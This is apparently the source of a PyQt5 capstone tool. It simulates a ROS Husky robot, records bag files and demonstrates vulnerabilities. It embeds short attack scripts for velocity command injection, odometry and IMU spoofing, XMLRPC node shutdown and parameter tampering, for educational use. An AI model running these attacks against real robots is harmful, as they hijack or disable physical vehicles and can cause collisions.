#!/usr/bin/env python3
"""
AVSVA - Autonomous Vehicle Simulation and Vulnerability Analyzer
A comprehensive tool for demonstrating and analyzing ROS vulnerabilities
"""

import sys
import os
import subprocess
import signal
from datetime import datetime
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                             QHBoxLayout, QPushButton, QLabel, QTextEdit,
                             QTabWidget, QGroupBox, QGridLayout, QFileDialog,
                             QListWidget, QSplitter, QMessageBox, QProgressBar,
                             QComboBox, QScrollArea, QCheckBox, QTabBar, QStylePainter,
                             QStyleOptionTab, QProxyStyle, QStyle)
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer, QSize, QRect
from PyQt5.QtGui import QFont, QColor, QPalette, QTransform

import rospy
from geometry_msgs.msg import Twist
from nav_msgs.msg import Odometry
from sensor_msgs.msg import Imu
import xmlrpc.client


class SimulationController(QThread):
    """Thread to control the simulation launch"""
    log_signal = pyqtSignal(str)
    status_signal = pyqtSignal(bool)
    
    def __init__(self):
        super().__init__()
        self.process = None
        self.running = False
        
    def run(self):
        """Launch the simulation"""
        try:
            script_path = os.path.join(os.path.dirname(__file__), 'simulation_scripts', 'launch_husky_auto_drive.sh')
            
            if not os.path.exists(script_path):
                self.log_signal.emit(f"ERROR: Launch script not found at {script_path}")
                self.status_signal.emit(False)
                return
            
            self.log_signal.emit("Starting Husky simulation...")
            self.log_signal.emit(f"Executing: {script_path}")
            
            # Make script executable
            os.chmod(script_path, 0o755)
            
            # Launch the simulation
            self.process = subprocess.Popen(
                ['bash', script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid
            )
            
            self.running = True
            self.status_signal.emit(True)
            self.log_signal.emit("Simulation started successfully!")
            self.log_signal.emit("Gazebo, RViz, and auto-drive are running...")
            
            # Monitor output
            while self.running:
                if self.process.poll() is not None:
                    break
                    
        except Exception as e:
            self.log_signal.emit(f"ERROR starting simulation: {str(e)}")
            self.status_signal.emit(False)
    
    def stop(self):
        """Stop the simulation"""
        self.running = False
        if self.process:
            try:
                self.log_signal.emit("Stopping simulation...")
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                self.process.wait(timeout=5)
                self.log_signal.emit("Simulation stopped successfully")
            except Exception as e:
                self.log_signal.emit(f"Error stopping simulation: {str(e)}")
                try:
                    os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
                except:
                    pass
        self.status_signal.emit(False)


class BagRecorder(QThread):
    """Thread to record ROS bag files"""
    log_signal = pyqtSignal(str)
    status_signal = pyqtSignal(bool)
    
    def __init__(self):
        super().__init__()
        self.process = None
        self.recording = False
        self.bag_filename = None
        
    def run(self):
        """Start recording"""
        try:
            # Create bags directory if it doesn't exist
            bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
            os.makedirs(bags_dir, exist_ok=True)
            
            # Generate filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.bag_filename = os.path.join(bags_dir, f"husky_attack_{timestamp}.bag")
            
            self.log_signal.emit(f"Starting bag recording: {self.bag_filename}")
            
            # Record all topics
            cmd = [
                'rosbag', 'record',
                '-O', self.bag_filename,
                '/husky_velocity_controller/cmd_vel',
                '/husky_velocity_controller/odom',
                '/imu/data',
                '/rosout',
                '/tf',
                '__name:=avsva_recorder'
            ]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.recording = True
            self.status_signal.emit(True)
            self.log_signal.emit("Recording started successfully!")
            
            # Wait for process
            self.process.wait()
            
        except Exception as e:
            self.log_signal.emit(f"ERROR starting recording: {str(e)}")
            self.status_signal.emit(False)
    
    def stop(self):
        """Stop recording"""
        self.recording = False
        if self.process:
            try:
                self.log_signal.emit("Stopping recording...")
                self.process.send_signal(signal.SIGINT)
                self.process.wait(timeout=5)
                self.log_signal.emit(f"Recording saved: {self.bag_filename}")
            except Exception as e:
                self.log_signal.emit(f"Error stopping recording: {str(e)}")
                self.process.kill()
        self.status_signal.emit(False)


class VulnerabilityExecutor(QThread):
    """Thread to execute vulnerability attacks by launching attack scripts"""
    log_signal = pyqtSignal(str)

    def __init__(self, vuln_id):
        super().__init__()
        self.vuln_id = vuln_id
        self.running = False
        self.process = None

        # Map vulnerability IDs to script filenames
        self.attack_scripts = {
            'cmd_vel_injection': 'attack_cmd_vel.py',
            'odom_spoofing': 'attack_odom.py',
            'node_shutdown': 'attack_shutdown.py',
            'param_manipulation': 'attack_param.py',
            'imu_spoofing': 'attack_imu.py'
        }

    def run(self):
        """Execute the vulnerability by launching the attack script"""
        try:
            script_name = self.attack_scripts.get(self.vuln_id)
            if not script_name:
                self.log_signal.emit(f"Unknown attack: {self.vuln_id}")
                return

            # Get the path to the attack script
            script_path = os.path.join(os.path.dirname(__file__), 'attack_scripts', script_name)

            if not os.path.exists(script_path):
                self.log_signal.emit(f"Attack script not found: {script_path}")
                return

            self.log_signal.emit(f"Launching attack: {script_name}")

            # Launch the attack script as a separate process
            self.process = subprocess.Popen(
                ['python3', script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            self.running = True
            self.log_signal.emit(f"Attack started successfully (PID: {self.process.pid})")

            # Monitor the process
            while self.running and self.process.poll() is None:
                # Check for output
                import select
                if self.process.stdout:
                    line = self.process.stdout.readline()
                    if line:
                        self.log_signal.emit(f"Attack output: {line.strip()}")
                self.msleep(100)  # Sleep 100ms

        except Exception as e:
            self.log_signal.emit(f"Attack error: {str(e)}")

    def stop(self):
        """Stop the attack process"""
        self.running = False
        if self.process and self.process.poll() is None:
            self.log_signal.emit("Stopping attack process...")
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
                self.log_signal.emit("Attack process stopped")
            except subprocess.TimeoutExpired:
                self.log_signal.emit("Force killing attack process...")
                self.process.kill()
                self.log_signal.emit("Attack process killed")


class VerticalTabBar(QTabBar):
    """Custom QTabBar that draws text horizontally even when tabs are vertical"""
    def __init__(self, parent=None):
        super().__init__(parent)
        
    def paintEvent(self, event):
        """Override paint event to draw horizontal text"""
        painter = QStylePainter(self)
        option = QStyleOptionTab()

        for index in range(self.count()):
            self.initStyleOption(option, index)
            painter.drawControl(QStyle.CE_TabBarTabShape, option)
            
            # Draw the text horizontally
            painter.save()
            
            # Get the tab rectangle
            rect = self.tabRect(index)
            
            # Draw text horizontally (not rotated)
            painter.drawText(rect, Qt.AlignCenter, self.tabText(index))
            
            painter.restore()
            
    def tabSizeHint(self, index):
        """Provide size hint for horizontal text"""
        size = super().tabSizeHint(index)
        # For West-side tabs, swap width and height and make wider
        return QSize(200, size.width())


class HorizontalTabWidget(QTabWidget):
    """TabWidget with horizontal text on vertical tabs"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setTabBar(VerticalTabBar(self))


class VulnerabilityCard(QGroupBox):
    """Widget for displaying vulnerability information"""
    log_signal = pyqtSignal(str)

    def __init__(self, vuln_data, parent=None):
        super().__init__(parent)
        self.vuln_data = vuln_data
        self.executor = None
        self.active = False

        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        
        # Header with name and severity
        header_layout = QHBoxLayout()
        
        name_label = QLabel(self.vuln_data['name'])
        name_label.setFont(QFont('Arial', 12, QFont.Bold))
        header_layout.addWidget(name_label)
        
        header_layout.addStretch()
        
        severity_label = QLabel(self.vuln_data['severity'].upper())
        severity_label.setFont(QFont('Arial', 10, QFont.Bold))
        
        if self.vuln_data['severity'] == 'critical':
            severity_label.setStyleSheet("color: #dc2626; background-color: #fee2e2; padding: 4px 8px; border-radius: 4px;")
        elif self.vuln_data['severity'] == 'high':
            severity_label.setStyleSheet("color: #ea580c; background-color: #ffedd5; padding: 4px 8px; border-radius: 4px;")
        else:
            severity_label.setStyleSheet("color: #ca8a04; background-color: #fef9c3; padding: 4px 8px; border-radius: 4px;")
        
        header_layout.addWidget(severity_label)
        layout.addLayout(header_layout)
        
        # Category
        category_label = QLabel(f"Category: {self.vuln_data['category']}")
        category_label.setFont(QFont('Arial', 9))
        category_label.setStyleSheet("color: #6b7280; margin-top: 4px;")
        layout.addWidget(category_label)
        
        # Description
        desc_label = QLabel("Description:")
        desc_label.setFont(QFont('Arial', 10, QFont.Bold))
        desc_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(desc_label)
        
        desc_text = QLabel(self.vuln_data['description'])
        desc_text.setWordWrap(True)
        desc_text.setStyleSheet("color: #374151; margin-left: 12px;")
        layout.addWidget(desc_text)
        
        # Why it's a vulnerability
        why_label = QLabel("Why this is a vulnerability:")
        why_label.setFont(QFont('Arial', 10, QFont.Bold))
        why_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(why_label)
        
        why_text = QLabel(self.vuln_data['why'])
        why_text.setWordWrap(True)
        why_text.setStyleSheet("color: #374151; margin-left: 12px;")
        layout.addWidget(why_text)
        
        # Impact
        impact_label = QLabel("Impact:")
        impact_label.setFont(QFont('Arial', 10, QFont.Bold))
        impact_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(impact_label)
        
        impact_text = QLabel(self.vuln_data['impact'])
        impact_text.setWordWrap(True)
        impact_text.setStyleSheet("color: #dc2626; margin-left: 12px;")
        layout.addWidget(impact_text)
        
        # Code example
        code_label = QLabel("Attack Code:")
        code_label.setFont(QFont('Arial', 10, QFont.Bold))
        code_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(code_label)
        
        code_text = QTextEdit()
        code_text.setPlainText(self.vuln_data['code'])
        code_text.setReadOnly(True)
        code_text.setMaximumHeight(150)
        code_text.setStyleSheet("""
            QTextEdit {
                background-color: #1f2937;
                color: #10b981;
                font-family: 'Courier New', monospace;
                font-size: 9pt;
                border: 1px solid #374151;
                border-radius: 4px;
                padding: 8px;
            }
        """)
        layout.addWidget(code_text)
        
        # Execute button
        self.execute_btn = QPushButton("Execute Attack")
        self.execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
                margin-top: 12px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
            QPushButton:pressed {
                background-color: #991b1b;
            }
        """)
        self.execute_btn.clicked.connect(self.toggle_attack)
        layout.addWidget(self.execute_btn)
        
        self.setLayout(layout)
        self.setStyleSheet("""
            QGroupBox {
                background-color: white;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                padding: 16px;
                margin-top: 8px;
            }
        """)
    
    def toggle_attack(self):
        """Toggle attack execution"""
        if not self.active:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        """Start the attack"""
        self.executor = VulnerabilityExecutor(self.vuln_data['id'])
        self.executor.log_signal.connect(self.on_log)
        self.executor.start()
        
        self.active = True
        self.execute_btn.setText("Stop Attack")
        self.execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #059669;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
                margin-top: 12px;
            }
            QPushButton:hover {
                background-color: #047857;
            }
        """)
    
    def stop_attack(self):
        """Stop the attack"""
        if self.executor:
            self.executor.stop()
            self.executor.wait()
        
        self.active = False
        self.execute_btn.setText("Execute Attack")
        self.execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
                margin-top: 12px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
        """)
    
    def on_log(self, message):
        """Handle log messages from executor"""
        # Emit signal to be connected by main window
        self.log_signal.emit(message)


class AVSVAMainWindow(QMainWindow):
    """Main application window"""
    
    def __init__(self):
        super().__init__()
        
        self.simulation_controller = None
        self.bag_recorder = None
        
        self.vulnerabilities = [
            {
                'id': 'cmd_vel_injection',
                'name': 'CMD_VEL Topic Injection',
                'severity': 'critical',
                'description': 'Injects malicious velocity commands to the /husky_velocity_controller/cmd_vel topic, competing with legitimate control commands.',
                'why': 'ROS topics allow multiple publishers without authentication. An attacker can publish conflicting commands, causing the robot to deviate from its intended path or stop entirely.',
                'impact': 'Robot loses intended trajectory, potential collision or mission failure',
                'category': 'Topic Hijacking',
                'code': '''#!/usr/bin/env python3
import rospy
from geometry_msgs.msg import Twist

rospy.init_node('attacker', anonymous=True)
pub = rospy.Publisher('/husky_velocity_controller/cmd_vel', Twist, queue_size=10)
rate = rospy.Rate(30)

attack_cmd = Twist()
attack_cmd.linear.x = 0.0      # Stop
attack_cmd.angular.z = 1.5     # Turn

while not rospy.is_shutdown():
    pub.publish(attack_cmd)
    rate.sleep()'''
            },
            {
                'id': 'odom_spoofing',
                'name': 'Odometry Sensor Spoofing',
                'severity': 'high',
                'description': 'Publishes false odometry data to make the robot believe it is in a different position or moving at a different velocity.',
                'why': 'ROS does not authenticate sensor data. An attacker can publish fake odometry messages, causing the navigation stack to make incorrect decisions based on false position information.',
                'impact': 'Navigation system receives incorrect localization, leading to path planning errors',
                'category': 'Sensor Manipulation',
                'code': '''#!/usr/bin/env python3
import rospy
from nav_msgs.msg import Odometry

rospy.init_node('odom_spoofer', anonymous=True)
pub = rospy.Publisher('/husky_velocity_controller/odom', Odometry, queue_size=10)

fake_odom = Odometry()
fake_odom.pose.pose.position.x = -10.0
fake_odom.twist.twist.linear.x = -0.5

rate = rospy.Rate(50)
while not rospy.is_shutdown():
    pub.publish(fake_odom)
    rate.sleep()'''
            },
            {
                'id': 'node_shutdown',
                'name': 'Node Shutdown Attack',
                'severity': 'critical',
                'description': 'Uses ROS XMLRPC API to remotely shutdown critical nodes like the autonomous driving controller.',
                'why': 'ROS nodes expose an XMLRPC interface without authentication. Any node can call the shutdown service on any other node, causing denial of service.',
                'impact': 'Critical control nodes terminated, complete loss of autonomous function',
                'category': 'Denial of Service',
                'code': '''#!/usr/bin/env python3
import rospy
import xmlrpc.client

master = xmlrpc.client.ServerProxy(rospy.get_master().getUri())
code, msg, uri = master.lookupNode('/caller', '/husky_auto_drive')

if code == 1:
    node = xmlrpc.client.ServerProxy(uri)
    node.shutdown('/attacker', 'Attack')'''
            },
            {
                'id': 'param_manipulation',
                'name': 'Parameter Server Manipulation',
                'severity': 'medium',
                'description': 'Modifies runtime parameters like linear_speed to cause dangerous behavior (e.g., negative speed for reverse, excessive speed).',
                'why': 'The ROS parameter server has no access control. Any node can read or modify any parameter, allowing attackers to change critical configuration values at runtime.',
                'impact': 'Robot behavior becomes unpredictable, potential for dangerous speeds or reverse motion',
                'category': 'Configuration Attack',
                'code': '''#!/usr/bin/env python3
import rospy

rospy.init_node('param_attacker')
rospy.set_param('/husky_auto_drive/linear_speed', -5.0)
# Robot now drives backward

# Or excessive speed:
rospy.set_param('/husky_auto_drive/linear_speed', 100.0)'''
            },
            {
                'id': 'imu_spoofing',
                'name': 'IMU Data Spoofing',
                'severity': 'high',
                'description': 'Injects false IMU (Inertial Measurement Unit) data to mislead the robot about its orientation and angular velocity.',
                'why': 'IMU data is critical for balance and orientation. Without message authentication, an attacker can publish false IMU readings that cause instability or incorrect orientation estimates.',
                'impact': 'Robot loses proper orientation awareness, potential tipping or navigation errors',
                'category': 'Sensor Manipulation',
                'code': '''#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import Imu

rospy.init_node('imu_spoofer', anonymous=True)
pub = rospy.Publisher('/imu/data', Imu, queue_size=10)

fake_imu = Imu()
fake_imu.angular_velocity.z = 10.0  # False rotation
fake_imu.linear_acceleration.x = 50.0

rate = rospy.Rate(100)
while not rospy.is_shutdown():
    pub.publish(fake_imu)
    rate.sleep()'''
            }
        ]
        
        self.init_ui()
    
    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("AVSVA - Autonomous Vehicle Simulation and Vulnerability Analyzer")
        self.setGeometry(100, 100, 1400, 900)
        
        # Set application style
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f3f4f6;
            }
            QTabWidget::pane {
                border: 1px solid #d1d5db;
                background-color: white;
                border-radius: 8px;
                margin-left: 10px;
            }
            QTabBar::tab {
                background-color: #e5e7eb;
                color: #374151;
                padding: 12px 20px;
                margin-bottom: 4px;
                border-top-left-radius: 8px;
                border-bottom-left-radius: 8px;
                font-weight: bold;
                min-width: 180px;
                text-align: left;
            }
            QTabBar::tab:selected {
                background-color: white;
                color: #1f2937;
            }
            QTabBar::tab:hover {
                background-color: #d1d5db;
            }
        """)
        
        # Main widget and layout
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QVBoxLayout(main_widget)
        main_layout.setContentsMargins(20, 20, 20, 20)
        
        # Header
        header = QLabel("AVSVA - Autonomous Vehicle Simulation and Vulnerability Analyzer")
        header.setFont(QFont('Arial', 18, QFont.Bold))
        header.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        main_layout.addWidget(header)
        
        subtitle = QLabel("Texas Tech University - Raider Security - CS Senior Capstone Project")
        subtitle.setFont(QFont('Arial', 10))
        subtitle.setStyleSheet("color: #6b7280; margin-bottom: 20px;")
        main_layout.addWidget(subtitle)
        
        # Create tab widget with tabs on left side (horizontal text)
        self.tabs = HorizontalTabWidget()
        self.tabs.setTabPosition(QTabWidget.West)  # Position tabs on the left
        main_layout.addWidget(self.tabs)

        # Create tabs
        self.create_simulation_tab()
        self.create_vulnerability_tab()
        self.create_analysis_tab()
        self.create_report_tab()
        
        # Status bar
        self.statusBar().showMessage("Ready")
        self.statusBar().setStyleSheet("background-color: #e5e7eb; color: #374151; font-weight: bold;")
    
    def create_simulation_tab(self):
        """Create the simulation control tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Simulation control group
        sim_group = QGroupBox("Simulation Control")
        sim_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                font-size: 14pt;
                border: 2px solid #d1d5db;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 16px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
        sim_layout = QVBoxLayout()
        
        # Status indicator
        status_layout = QHBoxLayout()
        status_label = QLabel("Status:")
        status_label.setFont(QFont('Arial', 12, QFont.Bold))
        status_layout.addWidget(status_label)
        
        self.status_indicator = QLabel("● Stopped")
        self.status_indicator.setFont(QFont('Arial', 12, QFont.Bold))
        self.status_indicator.setStyleSheet("color: #dc2626;")
        status_layout.addWidget(self.status_indicator)
        status_layout.addStretch()
        sim_layout.addLayout(status_layout)
        
        # Control buttons
        btn_layout = QHBoxLayout()
        
        self.start_sim_btn = QPushButton("▶ Start Simulation")
        self.start_sim_btn.setMinimumHeight(50)
        self.start_sim_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.start_sim_btn.setStyleSheet("""
            QPushButton {
                background-color: #10b981;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #059669;
            }
            QPushButton:pressed {
                background-color: #047857;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.start_sim_btn.clicked.connect(self.start_simulation)
        btn_layout.addWidget(self.start_sim_btn)
        
        self.stop_sim_btn = QPushButton("■ Stop Simulation")
        self.stop_sim_btn.setMinimumHeight(50)
        self.stop_sim_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.stop_sim_btn.setEnabled(False)
        self.stop_sim_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
            QPushButton:pressed {
                background-color: #991b1b;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.stop_sim_btn.clicked.connect(self.stop_simulation)
        btn_layout.addWidget(self.stop_sim_btn)
        
        sim_layout.addLayout(btn_layout)
        sim_group.setLayout(sim_layout)
        layout.addWidget(sim_group)
        
        # Recording control group
        rec_group = QGroupBox("Bag File Recording")
        rec_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                font-size: 14pt;
                border: 2px solid #d1d5db;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 16px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
        rec_layout = QVBoxLayout()
        
        # Recording status
        rec_status_layout = QHBoxLayout()
        rec_status_label = QLabel("Recording:")
        rec_status_label.setFont(QFont('Arial', 12, QFont.Bold))
        rec_status_layout.addWidget(rec_status_label)
        
        self.rec_indicator = QLabel("● Not Recording")
        self.rec_indicator.setFont(QFont('Arial', 12, QFont.Bold))
        self.rec_indicator.setStyleSheet("color: #6b7280;")
        rec_status_layout.addWidget(self.rec_indicator)
        rec_status_layout.addStretch()
        rec_layout.addLayout(rec_status_layout)
        
        # Recording buttons
        rec_btn_layout = QHBoxLayout()
        
        self.start_rec_btn = QPushButton("● Start Recording")
        self.start_rec_btn.setMinimumHeight(50)
        self.start_rec_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.start_rec_btn.setEnabled(False)
        self.start_rec_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.start_rec_btn.clicked.connect(self.start_recording)
        rec_btn_layout.addWidget(self.start_rec_btn)
        
        self.stop_rec_btn = QPushButton("■ Stop Recording")
        self.stop_rec_btn.setMinimumHeight(50)
        self.stop_rec_btn.setFont(QFont('Arial', 12, QFont.Bold))
        self.stop_rec_btn.setEnabled(False)
        self.stop_rec_btn.setStyleSheet("""
            QPushButton {
                background-color: #374151;
                color: white;
                border: none;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #1f2937;
            }
            QPushButton:disabled {
                background-color: #d1d5db;
                color: #9ca3af;
            }
        """)
        self.stop_rec_btn.clicked.connect(self.stop_recording)
        rec_btn_layout.addWidget(self.stop_rec_btn)
        
        rec_layout.addLayout(rec_btn_layout)
        rec_group.setLayout(rec_layout)
        layout.addWidget(rec_group)
        
        # Log output
        log_group = QGroupBox("System Log")
        log_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                font-size: 14pt;
                border: 2px solid #d1d5db;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 16px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
        log_layout = QVBoxLayout()
        
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("""
            QTextEdit {
                background-color: #1f2937;
                color: #10b981;
                font-family: 'Courier New', monospace;
                font-size: 10pt;
                border: 1px solid #374151;
                border-radius: 4px;
                padding: 8px;
            }
        """)
        log_layout.addWidget(self.log_output)
        
        clear_log_btn = QPushButton("Clear Log")
        clear_log_btn.setStyleSheet("""
            QPushButton {
                background-color: #6b7280;
                color: white;
                border: none;
                padding: 8px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #4b5563;
            }
        """)
        clear_log_btn.clicked.connect(self.log_output.clear)
        log_layout.addWidget(clear_log_btn)
        
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        self.tabs.addTab(tab, "Robot Simulation")
    
    def create_vulnerability_tab(self):
        """Create the vulnerability injection tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Header
        header = QLabel("Inject Vulnerabilities into Live Simulation")
        header.setFont(QFont('Arial', 14, QFont.Bold))
        header.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        layout.addWidget(header)
        
        warning = QLabel("⚠️ Warning: These attacks will disrupt the robot's normal operation. Ensure simulation is running before executing.")
        warning.setStyleSheet("color: #dc2626; background-color: #fee2e2; padding: 10px; border-radius: 6px; margin-bottom: 20px;")
        warning.setWordWrap(True)
        layout.addWidget(warning)
        
        # Create scroll area for vulnerability cards
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("""
            QScrollArea {
                border: none;
                background-color: #f9fafb;
            }
        """)
        
        scroll_widget = QWidget()
        scroll_layout = QVBoxLayout(scroll_widget)
        scroll_layout.setSpacing(16)
        
        # Create vulnerability cards
        for vuln in self.vulnerabilities:
            card = VulnerabilityCard(vuln, self)
            card.log_signal.connect(self.add_log)  # Connect card's log signal to main window's add_log
            scroll_layout.addWidget(card)
        
        scroll_layout.addStretch()
        scroll.setWidget(scroll_widget)
        layout.addWidget(scroll)
        
        self.tabs.addTab(tab, "Vulnerability Injection")
    
    def create_analysis_tab(self):
        """Create the bag file analysis tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Header
        header = QLabel("Bag File Analysis")
        header.setFont(QFont('Arial', 14, QFont.Bold))
        header.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        layout.addWidget(header)
        
        # Split layout
        splitter = QSplitter(Qt.Horizontal)
        
        # Left side - bag file list
        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        
        list_label = QLabel("Recorded Bag Files:")
        list_label.setFont(QFont('Arial', 11, QFont.Bold))
        left_layout.addWidget(list_label)
        
        self.bag_list = QListWidget()
        self.bag_list.setStyleSheet("""
            QListWidget {
                border: 2px solid #d1d5db;
                border-radius: 6px;
                padding: 8px;
                background-color: white;
            }
            QListWidget::item {
                padding: 8px;
                border-bottom: 1px solid #e5e7eb;
            }
            QListWidget::item:selected {
                background-color: #dbeafe;
                color: #1e40af;
            }
        """)
        self.bag_list.itemClicked.connect(self.load_bag_file)
        left_layout.addWidget(self.bag_list)
        
        refresh_btn = QPushButton("🔄 Refresh List")
        refresh_btn.setStyleSheet("""
            QPushButton {
                background-color: #3b82f6;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #2563eb;
            }
        """)
        refresh_btn.clicked.connect(self.refresh_bag_list)
        left_layout.addWidget(refresh_btn)
        
        load_external_btn = QPushButton("📂 Load External Bag File")
        load_external_btn.setStyleSheet("""
            QPushButton {
                background-color: #6b7280;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #4b5563;
            }
        """)
        load_external_btn.clicked.connect(self.load_external_bag)
        left_layout.addWidget(load_external_btn)
        
        splitter.addWidget(left_widget)
        
        # Right side - analysis output
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        
        analysis_label = QLabel("Bag File Analysis:")
        analysis_label.setFont(QFont('Arial', 11, QFont.Bold))
        right_layout.addWidget(analysis_label)
        
        self.analysis_output = QTextEdit()
        self.analysis_output.setReadOnly(True)
        self.analysis_output.setStyleSheet("""
            QTextEdit {
                background-color: white;
                border: 2px solid #d1d5db;
                border-radius: 6px;
                padding: 12px;
                font-family: 'Courier New', monospace;
                font-size: 10pt;
            }
        """)
        right_layout.addWidget(self.analysis_output)
        
        splitter.addWidget(right_widget)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 2)
        
        layout.addWidget(splitter)
        
        # Initial refresh
        self.refresh_bag_list()
        
        self.tabs.addTab(tab, "Analysis")

    def create_report_tab(self):
        """Create the report generation tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(16)

        # Title
        title = QLabel("Generate Security Report")
        title.setFont(QFont('Arial', 16, QFont.Bold))
        title.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        layout.addWidget(title)

        # Description
        desc = QLabel("Generate a comprehensive security analysis report based on the vulnerabilities demonstrated and bag file analysis.")
        desc.setWordWrap(True)
        desc.setStyleSheet("color: #6b7280; margin-bottom: 20px;")
        layout.addWidget(desc)

        # Report options group
        options_group = QGroupBox("Report Options")
        options_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                margin-top: 12px;
                padding: 16px;
                background-color: white;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        options_layout = QVBoxLayout()

        # Report format
        format_label = QLabel("Report Format:")
        format_label.setFont(QFont('Arial', 10, QFont.Bold))
        options_layout.addWidget(format_label)

        self.report_format = QComboBox()
        self.report_format.addItems(["PDF Report", "HTML Report", "Markdown Report", "Text Report"])
        self.report_format.setStyleSheet("""
            QComboBox {
                padding: 8px;
                border: 2px solid #e5e7eb;
                border-radius: 6px;
                background-color: white;
            }
        """)
        options_layout.addWidget(self.report_format)

        # Include sections checkboxes
        sections_label = QLabel("Include Sections:")
        sections_label.setFont(QFont('Arial', 10, QFont.Bold))
        sections_label.setStyleSheet("margin-top: 16px;")
        options_layout.addWidget(sections_label)

        self.include_exec_summary = QCheckBox("Executive Summary")
        self.include_exec_summary.setChecked(True)
        options_layout.addWidget(self.include_exec_summary)

        self.include_vulnerabilities = QCheckBox("Vulnerability Details")
        self.include_vulnerabilities.setChecked(True)
        options_layout.addWidget(self.include_vulnerabilities)

        self.include_attack_logs = QCheckBox("Attack Execution Logs")
        self.include_attack_logs.setChecked(True)
        options_layout.addWidget(self.include_attack_logs)

        self.include_bag_analysis = QCheckBox("Bag File Analysis")
        self.include_bag_analysis.setChecked(True)
        options_layout.addWidget(self.include_bag_analysis)

        self.include_recommendations = QCheckBox("Security Recommendations")
        self.include_recommendations.setChecked(True)
        options_layout.addWidget(self.include_recommendations)

        options_group.setLayout(options_layout)
        layout.addWidget(options_group)

        # Report preview area
        preview_group = QGroupBox("Report Preview")
        preview_group.setStyleSheet("""
            QGroupBox {
